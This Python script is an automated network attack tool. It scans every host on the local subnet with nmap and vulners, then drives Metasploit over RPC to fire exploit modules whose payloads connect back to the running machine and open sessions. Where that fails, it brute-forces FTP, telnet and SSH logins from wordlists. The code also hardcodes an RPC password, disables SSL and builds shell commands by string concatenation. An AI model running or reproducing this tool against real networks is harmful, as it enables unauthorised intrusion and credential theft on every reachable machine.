import nmap
import socket
import struct
import os
import ipaddress
import re
import random, string
from datetime import datetime
import netifaces
import platform
import sys
import time
from pymetasploit3.msfrpc import *
import pandas as pd
import csv
from io import StringIO
import argparse


def banner():
	os.system('clear')
	pwny = 0
	while pwny < 10:
		spaces = 8 * pwny * " "
		print("   _____       _____        _      ____    _____           _   _")
		print("  |  __ \\     |  __ \\      | |    |___ \\  |  __ \\         | \\ | |")
		print("  | |__) |   _| |__) |_ __ | |      __) | | |__) |_      _|  \\| |_   _")
		print("  |  ___/ | | |  _  /| '_ \\| |     |__ <  |  ___/\\ \\ /\\ / / . ` | | | |")
		print("  | |   | |_| | | \\ \\| |_) | |____ ___) | | |     \\ V  V /| |\\  | |_| |")
		print("  |_|    \\__,_|_|  \\_\\ .__/|______|____/  |_|      \\_/\\_/ |_| \\_|\\__, |")
		print("                     | |                                          __/ |")
		print("                     |_|                                         |___/")
		print()
		print(spaces + "             .'' ")
		print(spaces + "   ._.-.___.' (`\\ ")
		print(spaces + "  //(        ( `' ")
		print(spaces + " '/ )\\ ).__. ) ")
		print(spaces + " ' <' `\\ ._/'\\ ")
		print(spaces + "    `   \\     \\ ")

		time.sleep(.25)
		os.system('clear')
		pwny += 1

	print("   _____       _____        _      ____    _____           _   _")
	print("  |  __ \\     |  __ \\      | |    |___ \\  |  __ \\         | \\ | |                    .''")
	print("  | |__) |   _| |__) |_ __ | |      __) | | |__) |_      _|  \\| |_   _     ._.-.___.' (`\\")
	print("  |  ___/ | | |  _  /| '_ \\| |     |__ <  |  ___/\\ \\ /\\ / / . ` | | | |   //(        ( `'")
	print("  | |   | |_| | | \\ \\| |_) | |____ ___) | | |     \\ V  V /| |\\  | |_| |  '/ )\\ ).__. )")
	print("  |_|    \\__,_|_|  \\_\\ .__/|______|____/  |_|      \\_/\\_/ |_| \\_|\\__, |  ' <' `\\ ._/'\\")
	print("                     | |                                          __/ |     `   \\     \\")
	print("                     |_|                                         |___/")
	print()


def bruteforce(host, service, port):
	bfResults = "failed"
	global startDir
	global userList, passList
	# userList = os.path.join(startDir, "bruteforce", "userList.txt")
	# passList = os.path.join(startDir, "bruteforce", "passList.txt")
	bruteFile = os.path.join(startDir, str(host).replace(".","-"), "bf-" + service + str(port) + ".txt")
	os.system("touch " + bruteFile + "&& echo '" + service + " credentials for " + str(host) + " on port " + str(port) +"' >> " + bruteFile)
	before = os.stat(bruteFile).st_size
	#cmd = f'nmap --script {service} -brute -p {str(port)} {str(host)} --script-args userdb={userList},passdb={passList} | grep "Valid" | cut -c 7- | rev | cut -c 21- | rev >> {bruteFile}'
	os.system("nmap --script " + service + "-brute -p" + str(port) + " " + str(host) + " --script-args userdb=" + userList + ",passdb=" + passList + " | grep 'Valid' | cut -c 7- | rev | cut -c 21- | rev >> " + bruteFile)
	if os.stat(bruteFile).st_size > before:
		bfResults = "exploited"
	else:
		os.system("rm " + bruteFile)
	return bfResults


def findModules(service, details, port, host):
    global console
    global startDir
    print("testing port:" + str(port) + " for host: " + host)
    hostDir = host.replace(".","-")
    fullPath = os.path.join(startDir, hostDir) # where we want to be
    fullPathCMD = 'cd ' + fullPath
    outFile = service + str(port) + '.csv'
    console.write(fullPathCMD) # make sure we go to right directory first
    while console.is_busy() == True:
        time.sleep(1)
	# what we want to search msfconsole for now that in right directory
    search = 'search ' + service + ' -S ' + details + ' type:exploit && rank:excellent || rank:great -o ' + outFile
    try:
        console.write(search) # actually perform the search for modules and store the output
        while console.is_busy() == True:
            time.sleep(1)
        pathToFile = os.path.join(fullPath, outFile)
        retries = 0
        if os.path.exists(pathToFile) == True:
        	while not os.access(pathToFile, os.R_OK | os.W_OK):
        		print("   Hmmm file may be locked. Re-trying...")
        		time.sleep(1)
        else:
        	while os.path.exists(pathToFile) == False and retries < 3:
        		retries += 1
        		time.sleep(1)
        if retries == 3:
        	print("  " + pathToFile + " could not be located.")
        	return "error"
        else:
        	return pathToFile
    except Exception as e:
        print("  error with search: " + str(e))
        return "error"


def exploitHost(host):
	global nm
	global client
	global console
	global bfServices
	global startDir
	global IP
	global maxPayloads

	numServWithModsOrBrute = 0
	numServExploited = 0
	exploitObjects = []
	try:
		hostDir = host.replace(".","-")
		os.system('cd / && cd ' + startDir[1:] + ' && mkdir ' + hostDir)
	except Exception as e:
		print(e)
	try:
		nm[host]['tcp'].keys()
	except:
		print("No 'TCP' keys found for host: " + host)
		return numServWithModsOrBrute, numServExploited
	for port in nm[host]['tcp'].keys():
		serviceExploited = False
		dfLen = 0
		service = str(nm[host]['tcp'][port]['name'])
		details = str(nm[host]['tcp'][port]['product']) + " " + str(nm[host]['tcp'][port]['version'])
		exploitFilePath = findModules(service, details, port, host)
		if exploitFilePath == "error":
			print("  No file returned from called method.")
		else:
			# initial read of file
			with open(exploitFilePath) as csvfile:
				readCSV = csvfile.read()
				df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
			dfLen = len(df.index)

			if dfLen == 0: # if the file was read but says no modules
				if os.stat(exploitFilePath).st_size > 46: # files with modules should be > 46 so we shoudnt be having problems... PANDAS
					print("  ****** why is df size 0! *******")
					time.sleep(1)
					df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name']) # try one more time
					dfLen = len(df.index) # should be greater than 0 - modules will run after above print is made if this worked
				else: # file was read, dfLen is 0, and file size is small so probably correct
					dfLen = 0
					print("  No modules found")

			if dfLen > 0:
				numServWithModsOrBrute += 1

				for index, row in df.iterrows():
					try:
						if len(client.sessions.list) < 1:
							result = "Fail"
							global lport
							lport += 1 # increment lport so that modules arent trying to use the same lport
							exploitName = row['Name'][8:]
							print("  Attempting module: " + exploitName)
							exploitObj = client.modules.use('exploit', exploitName)
							for item in exploitObj.options:
								if 'rhost' in str(item).lower():
									exploitObj[item] = host
								elif 'rport' in str(item).lower():
										exploitObj[item] = port

							if len(exploitObj.missing_required) > 0:
								for item in exploitObj.missing_required:
									print("    Item not set: " + item)
								print("    Exiting exploit: " + exploitName)

							else:
								if len(exploitObj.payloads) > 0:
									i = 0
									while (i < len(exploitObj.payloads) and i < maxPayloads) and len(client.sessions.list) < 1:
										try:
											payloadName = exploitObj.payloads[i]
											payloadObj = client.modules.use('payload', payloadName)
											for item in payloadObj.options:
												if 'rhost' in str(item).lower():
													payloadObj[item] = host
												elif 'rport' in str(item).lower():
														payloadObj[item] = port
												elif 'lhost' in str(item).lower():
														payloadObj[item] = IP

											if len(payloadObj.missing_required) > 0:
												for item in payloadObj.missing_required:
													print("      Item not set: " + item)
												print("      Exiting payload: " + payloadName)
												i += 1
											else:
												try:
													exploitObj.execute(payload=payloadObj)
													hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payloadName), 'Result':result}
													exploitObjects.append(hostExploits)
													i += 1
												except:
													print("      Bad Payload. Moving on.")
													i += 1
										except Exception as e:
											print(e)
											i += 1
								else: # No payloads available so try exploit without any
									print("  No payloads available. ")
						else:
							print("  Session was found. Exiting modules for current service.")
							break
					except Exception as e:
						if "Connection aborted" in e:
							print("Connection error. The most recent calls to Msfrpc may be lost. Attempting to reconnect ...")
							client = MsfRpcClient('testpw', port=55553, ssl=False)
						else:
							print(e)
				# check that all jobs are complete
				sleepCount = 0
				if len(client.jobs.list) > 0: # still have jobs running so wait a max of 30 secondds if not exploited before
					while len(client.jobs.list) > 0 and sleepCount < 30 and serviceExploited == False:
						if len(client.sessions.list) > 0:
							for job in client.jobs.list:
								client.jobs.stop(job)
							numServExploited += 1
							serviceExploited = True
							for index in client.sessions.list:
								for item in exploitObjects:
									if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]) and item["Port"] == str(client.sessions.list[index]['session_port']):
										item['Result'] = 'Success'
								client.sessions.session(index).stop()
						else:
							time.sleep(1)
							sleepCount += 1

				if len(client.jobs.list) < 1 and serviceExploited == False:
					time.sleep(2)
					if len(client.sessions.list) > 0:
						numServExploited += 1
						serviceExploited = True
						for index in client.sessions.list:
							for item in exploitObjects:
								if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]) and item["Port"] == str(client.sessions.list[index]['session_port']):
									item['Result'] = 'Success'
							client.sessions.session(index).stop()

		if serviceExploited == False:
			#print("  Service on port " + str(port) + " not exploited.")
			for job in client.jobs.list: # make sure all (if any) jobs are stopped
				client.jobs.stop(job)
			if service in bfServices: # service not yet exploited so see if we can bruteforce
				print("  No successful MS modules. Attempting bruteforce on service: " + service)
				if dfLen == 0: # if dfLen > 0 then this was already incremented from module testing
					numServWithModsOrBrute += 1 # if not ^^ and bruteforcable then increment here
				bruteResults = bruteforce(host, service, port)
				if bruteResults == "exploited":
					numServExploited += 1
					print("  Service on port " + str(port) + " was exploited by bruteforce!")
				else:
					print("  Service on port " + str(port) + " not exploited by MS modules and bruteforce failed.")
			else:
				print("  Service on port " + str(port) + " not exploited by MS modules and is not brute-forceable.")
		else:
			print("  Service on port " + str(port) + " was exploited by MS modules!")

	try:
		outDir = host.replace(".","-")
		csv_file = outDir + '/exploits.csv'
		with open(csv_file, 'w') as csvfile:
			writer = csv.DictWriter(csvfile, fieldnames = ["IP", "Service", "Port", "Exploit", "Payload", "Result"])
			writer.writeheader()
			for x in exploitObjects:
				writer.writerow(x)

	except Exception as e:
		print("Error writing to exploits.csv: " + str(e))

	print(str(numServExploited) + "/" + str(numServWithModsOrBrute) + " tested services were exploited on host: " + host)
	return numServWithModsOrBrute, numServExploited


def main(args):
	if args.b:
		if not os.path.exists(args.b[0] or args.b[1]):
			print("One or both of the bruteforce files could not be found. Please enter a correct filepath or use the default path.")
			sys.exit()
		global userList, passList
		userList = args.b[0]
		passList = args.b[1]
	if args.p:
		if not args.p > 0:
			print("int value for '--p' must be greater than 0.")
			sys.exit()
		global maxPayloads
		maxPayloads = args.p
	else:
		print("int value for '--p' must be greater than 0.")
		sys.exit()
	banner()
	print("Running script with the following options:")
	print("--> Bruteforce user file: " + userList)
	print("--> Bruteforce password file: " + passList)
	print("--> Max payloads per exploit module: " + str(maxPayloads))
	global nm
	global client
	global console
	global bfServices
	global startDir
	global IP
	global lport

	startTime = datetime.now()


	# Open file for writing our output and create if its not created already
	f = open(startDir + "/overview.txt","a+")
	# get host IP
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		# doesn't even have to be reachable
		s.connect(('10.255.255.255', 1))
		IP = s.getsockname()[0]
	except:
		IP = '127.0.0.1'
	finally:
		s.close()

	# get OS platform for deciding code to run later if needed
	operatingSystem = platform.system()
	nm = nmap.PortScanner()

	f.write('Begin Script @ {0} \n\n'.format(startTime))
	f.write("---- Script options ----\n")
	f.write("--> Bruteforce user file: {0}\n".format(userList))
	f.write("--> Bruteforce password file: {0}\n".format(passList))
	f.write("--> Max payloads per exploit module: {0} \n\n".format(str(maxPayloads)))
	f.write('------ Your Host ------\n')
	f.write('Host IP: {0} \n'.format(IP))

	# Cross Platform way to get the following info about our machine
	for i in netifaces.interfaces():
	   try:
	      if netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'] == IP: # .startswith("192") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("10") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("172")
	         f.write("Operating System: {0} \n".format(platform.system()))
	         netmask = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['netmask']
	         f.write("Network Mask: {0} \n".format(netmask))
	         f.write("Gateway IP: {0} \n".format(netifaces.gateways()['default'][netifaces.AF_INET][0]))
	         break
	      else:
	         pass
	   except:
		   pass

	# Creates an ipaddress object that is used to hold all of the IPs on the subnet
	subnet = ipaddress.ip_network(u'{0}/{1}'.format(IP, netmask),strict=False)

	# Just a prompt for the output file
	f.write('\nInitiating service scan from host {0} to {1} \n'.format(subnet[0], subnet[-1]))


	# NMAP subnet excluding our IP #
	## make -Pn, -F, and speed (-T#) switch for during the run
	print("Nmap scan started. This may take a while...")
	nm.scan(hosts=str(subnet), arguments='-O -sV -T4 -p- -Pn --script vulners --exclude ' + IP)
	print("Nmap scan complete!")

	hostsCount = len(nm.all_hosts())
	hostObjects = []
	f.write("Count of alive hosts: {0}\n".format(hostsCount))
	f2 = open("IPList.txt","a+")
	f2.write('\n'.join(map(str,nm.all_hosts())))
	f2.close()
	f3 = open(startDir + "/serviceDetails.txt","a+")
	f4 = open(startDir + "/cveDetails.txt","a+")

	## GLOBAL VARIBALES ##
	# start at lport 49152 for modules to use (to be incremented later)

	lport = 49152
	bfServices = ["ftp","telnet","ssh"]

	for host in nm.all_hosts():
		cveCount = 0 # get len(tabs) / 3 for each port and add to cveCount
		topCVEscore = -1 # Highest CVE score for the system used to determine severity level
		severity = 'Inconclusive' # System vulnerability status based on highest CVE score between all services
		severityNum = 0 # map severity to a number 0-4 for ordering systems
		countCritical = 0 # total number of CVEs that fall in that severity level
		countHigh = 0 # total number of CVEs that fall in that severity level
		countMedium = 0 # total number of CVEs that fall in that severity level
		countLow = 0 # total number of CVEs that fall in that severity level
		countNone = 0 # total number of CVEs that fall in that severity level
		countNoCVEports = 0 # used to determine when to print "No CVEs for this host." (ie when no servies found or no CVEs found)
		services = 0 # number of services running on the host (same service on 2 different ports counts as 2 services here)

		try:
			OS = nm[host]['osmatch'][0]['name']
		except:
			 OS = 'No OS Found'
		f3.write("\nIP: {0}".format(host))
		f4.write("IP: {0}\n".format(host))
		try:
			f3.write("\n\tPort    Service                  Details")
			for port in nm[host]['tcp'].keys():
				services += 1
				serviceFull = str(port).ljust(8," ") + nm[host]['tcp'][port]['name'].ljust(25, " ") + nm[host]['tcp'][port]['product'] + " " + nm[host]['tcp'][port]['version']
				try:
					nm[host]['tcp'][port]['script']['vulners']
					f4.write("  Port: " + str(port))
				except:
					pass
				f3.write('\n\t' + serviceFull)
				try:
					tabs = []
					cveScoreList = []
					start = 1

					for m in re.finditer('\t', nm[host]['tcp'][port]['script']['vulners']):
						tabs.append(m.start())
					cveCount = cveCount + (len(tabs) / 3)
					currentCVEscore = float(nm[host]['tcp'][port]['script']['vulners'][tabs[1]+1:tabs[1]+2])
					if currentCVEscore > topCVEscore:
						topCVEscore = currentCVEscore
					while start <= len(tabs)-2:
						cveScoreList.append(float(nm[host]['tcp'][port]['script']['vulners'][tabs[start]+1:tabs[start+1]]))
						start += 3

					for score in cveScoreList:
						if currentCVEscore == 0:
							countNone += 1
						elif currentCVEscore >= 0.1 and currentCVEscore <=  3.9:
							countLow += 1
						elif currentCVEscore >= 4.0 and currentCVEscore <=  6.9:
							countMedium += 1
						elif currentCVEscore >= 7.0 and currentCVEscore <=  8.9:
							countHigh += 1
						elif currentCVEscore >= 9.0 and currentCVEscore <=  10:
							countCritical += 1

					### Use this if you want to print CVE details for each service ###
					try:
						f4.write('        ' + nm[host]['tcp'][port]['script']['vulners'] + '\n\n')
					except:
						pass
				except:
					countNoCVEports += 1
					if countNoCVEports == len(nm[host]['tcp'].keys()):
						f4.write("  No CVEs for this host.\n\n")
					else:
						pass
		except:
			f3.write("\n\tNo Services for this host.\n")
			f4.write("No CVEs for this host.\n")

		if topCVEscore == -1:
			severity = 'Inconclusive'
			severityNum = -1
		elif topCVEscore == 0:
			severity = 'None'
			severityNum = 0
		elif topCVEscore >= 0.1 and topCVEscore <=  3.9:
			severity = 'Low'
			severityNum = 1
		elif topCVEscore >= 4.0 and topCVEscore <=  6.9:
			severity = 'Medium'
			severityNum = 2
		elif topCVEscore >= 7.0 and topCVEscore <=  8.9:
			severity = 'High'
			severityNum = 3
		elif topCVEscore >= 9.0 and topCVEscore <=  10:
			severity = 'Critical'
			severityNum = 4

		thisHost = {"IP":host, "Severity":severity, "SeverityNum":severityNum, "Criticals":countCritical, "Highs":countHigh, "Mediums":countMedium, "Lows":countLow, "Nones":countNone, "CVECount":cveCount, "ServiceCount":services, "ServicesWithModsOrBrute":0, "ServicesExploited":0 ,"OS":OS}
		hostObjects.append(thisHost)

	hostObjects.sort(key = lambda l: (l["SeverityNum"], l["Criticals"], l["Highs"], l["Mediums"], l["Lows"], l["Nones"]), reverse = True)
	printed4 = False
	printed3 = False
	printed2 = False
	printed1 = False
	printed0 = False
	printedNeg = False


	# start msf remote api
	os.system("msfrpcd -P testpw -S")
	time.sleep(5) # pause for the service to fully start
	client = MsfRpcClient('testpw', port=55553, ssl=False) # make connection

	cid = client.consoles.console().cid # create console and get Id
	console = client.consoles.console(cid)



	for system in hostObjects:
		countWithModsOrBrute, countExploited = exploitHost(system["IP"])
		system["ServicesWithModsOrBrute"] = countWithModsOrBrute
		system["ServicesExploited"] = countExploited
		if system["SeverityNum"] == 4:
			if printed4 == False:
				printed4 = True
				f.write("\n--- Vulnerability Level: Critical ---\n")
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
			else:
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
		elif system["SeverityNum"] == 3:
			if printed3 == False:
				printed3 = True
				f.write("\n--- Vulnerability Level: High ---\n")
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
			else:
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
		elif system["SeverityNum"] == 2:
			if printed2 == False:
				printed2 = True
				f.write("\n--- Vulnerability Level: Medium ---\n")
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
			else:
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
		elif system["SeverityNum"] == 1:
			if printed1 == False:
				printed1 = True
				f.write("\n--- Vulnerability Level: Low ---\n")
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
			else:
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
		elif system["SeverityNum"] == 0:
			if printed0 == False:
				printed0 = True
				f.write("\n--- Vulnerability Level: None ---\n")
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
			else:
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
		elif system["SeverityNum"] == -1:
			if printedNeg  == False:
				printedNeg = True
				f.write("\n--- Vulnerability Level: Inconclusive ---\n")
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))
			else:
				f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS-Modules or BF-able: {11}\n\t\tServices Exploited: {12}\n".format(system["IP"],system["Severity"],system["SeverityNum"],system["Criticals"],system["Highs"],system["Mediums"],system["Lows"],system["Nones"],system["CVECount"], system["OS"], system["ServiceCount"], system["ServicesWithModsOrBrute"], system["ServicesExploited"]))


	endTime = datetime.now()
	runtime = endTime-startTime
	os.system("killall ruby")
	f.write('\n\n End Script @ {0}    ---   Total Runtime: {1}'.format(endTime, runtime))
	f.close()


if __name__ == "__main__":
    global startDir
    startDir = os.path.dirname(os.path.realpath(sys.argv[0]))
    userList = os.path.join(startDir, "bruteforce", "userList.txt")
    passList = os.path.join(startDir, "bruteforce", "passList.txt")
    parser = argparse.ArgumentParser()
    parser.add_argument("--b", type=str, nargs=2, default=[userList,passList], help="Specify filepaths for bruteforce users list [arg1] and passwords list [arg2].")
    parser.add_argument("--p", type=int, default=5, help="Specify number of payloads per exploit module to try.")
    args = parser.parse_args()
    main(args)
